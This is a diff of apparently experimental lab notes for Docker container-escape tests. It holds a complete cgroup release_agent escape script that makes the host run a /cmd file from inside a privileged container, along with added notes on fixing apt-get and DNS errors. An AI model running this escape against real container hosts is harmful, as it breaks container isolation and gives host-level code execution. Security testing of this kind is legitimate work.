@@ -28,20 +28,15 @@ docker run --name ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=
 # In the container, create escape.sh file with following
 
 #!/bin/sh
-date
 mkdir /tmp/cgrp
 mount -t cgroup -o memory cgroup_memory /tmp/cgrp
 mkdir /tmp/cgrp/x
-date
 echo 1 > /tmp/cgrp/x/notify_on_release
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
-date
 cat stress.txt > /cmd
 chmod a+x /cmd
-date
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
-date
 
 #=================================================#
 # CONTAINER ATTACK A
@@ -135,6 +130,16 @@ Using x86_64 syscall table:
 #                   # chmod +x escape.sh
 #=================================================#
 docker commit ESCAPE_A ubuntu_escape
+
+# For some containers the keys/libsec are old and need to be updated
+# https://askubuntu.com/questions/1263284/apt-update-throws-signature-error-in-ubuntu-20-04-container-on-arm
+# Can also get other errors
+# https://stackoverflow.com/questions/24832972/docker-apt-get-update-fails
+# The one that finally corrected the problem is here
+# https://stackoverflow.com/questions/24832972/docker-apt-get-update-fails
+# Added to hosts /etc/default/docker the following line: DOCKER_OPTS="--ip-masq=true --dns 8.8.8.8 --dns 8.8.4.4"
+# Then restarted docker: sudo service restart docker
+# Then started the ubuntu container and was able to run 'apt-get update'
 
 # Using original ubuntu, install nano, add escape.sh, then commit
 docker run --privileged --name=ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
